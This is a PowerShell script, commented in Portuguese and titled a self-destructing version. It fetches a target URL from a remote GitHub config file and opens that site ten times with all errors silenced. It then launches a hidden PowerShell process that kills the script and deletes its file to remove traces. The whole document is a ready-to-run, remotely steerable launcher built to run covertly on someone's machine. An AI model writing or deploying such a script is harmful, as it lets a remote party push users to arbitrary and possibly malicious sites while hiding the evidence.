# abrir.ps1 - versão autodestrutiva
$ErrorActionPreference = 'SilentlyContinue'

# ===== CONFIG =====
$configUrl = "https://raw.githubusercontent.com/capimmm/7834569/main/config.txt"
$qtd       = 10
$fallback  = "https://example.com"
# ==================

# 1) Lê a URL atual do GitHub
$site = $fallback
try {
    $r = Invoke-WebRequest -Uri $configUrl -UseBasicParsing -TimeoutSec 10
    $linha = ($r.Content -split "`n" | Where-Object { $_.Trim() -ne "" } | Select-Object -First 1)
    if ($linha) { $site = $linha.Trim() }
} catch { }

# 2) Abre o site N vezes (silenciosamente)
for ($i = 1; $i -le $qtd; $i++) {
    Start-Process $site
    Start-Sleep -Milliseconds 250
}

# 3) Autodestruição — agenda um processo "coveiro" que nos mata e apaga o arquivo
$me    = $MyInvocation.MyCommand.Path
$myPid = $PID
if ($me -and (Test-Path $me)) {
    $coveiro = "Start-Sleep -Milliseconds 1500; " +
               "Stop-Process -Id $myPid -Force -ErrorAction SilentlyContinue; " +
               "Remove-Item -LiteralPath '$me' -Force -ErrorAction SilentlyContinue"
    Start-Process powershell.exe -ArgumentList '-NoProfile','-WindowStyle','Hidden','-Command',$coveiro -WindowStyle Hidden
}
